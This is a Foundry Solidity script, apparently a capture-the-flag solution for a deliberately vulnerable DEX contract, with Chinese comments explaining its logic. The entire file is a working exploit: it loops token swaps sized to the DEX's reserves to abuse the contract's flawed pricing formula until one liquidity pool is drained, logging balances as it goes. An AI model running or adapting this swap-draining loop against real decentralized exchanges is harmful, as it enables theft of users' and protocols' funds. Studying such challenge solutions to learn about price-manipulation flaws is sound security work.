// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function approve(address spender, uint256 amount) external;
    function swap(address from, address to, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
}

contract DexAttackScript is Script {
    function run() external {
        address instanceAddress = vm.envAddress("INSTANCE_ADDRESS");
        IDex dex = IDex(instanceAddress);
        
        address t1 = dex.token1();
        address t2 = dex.token2();

        vm.startBroadcast();

        // 授權 Dex
        dex.approve(instanceAddress, 1000);

        // 只要 Dex 的任一邊代幣還有錢，我們就繼續搬
        while (dex.balanceOf(t1, instanceAddress) > 0 && dex.balanceOf(t2, instanceAddress) > 0) {
            
            // 判斷換匯方向：哪種代幣在我手上，我就把它全部換出去
            address from = dex.balanceOf(t1, msg.sender) > 0 ? t1 : t2;
            address to = (from == t1) ? t2 : t1;

            // 核心邏輯：swap min(我的餘額, DEX 庫存)
            // 為什麼是 DEX 庫存？因為根據公式，如果你投入跟 DEX 庫存等量的代幣，
            // 就能剛好 1:1 把對面那一邊的代幣全部換走（清空）。
            uint256 myBalance = dex.balanceOf(from, msg.sender);
            uint256 dexSourceBalance = dex.balanceOf(from, instanceAddress);
            
            uint256 swapAmount = myBalance < dexSourceBalance ? myBalance : dexSourceBalance;

            console.log("Swapping amount:", swapAmount);
            console.log("From:", from == t1 ? "T1" : "T2");
            console.log("To:", to == t1 ? "T1" : "T2");
            
            dex.swap(from, to, swapAmount);

            // 印出當前戰況
            console.log("Dex T1 Balance:", dex.balanceOf(t1, instanceAddress));
            console.log("Dex T2 Balance:", dex.balanceOf(t2, instanceAddress));
            console.log("-------------------");
        }

        console.log("Success! One of the pools is empty.");
        vm.stopBroadcast();
    }
}
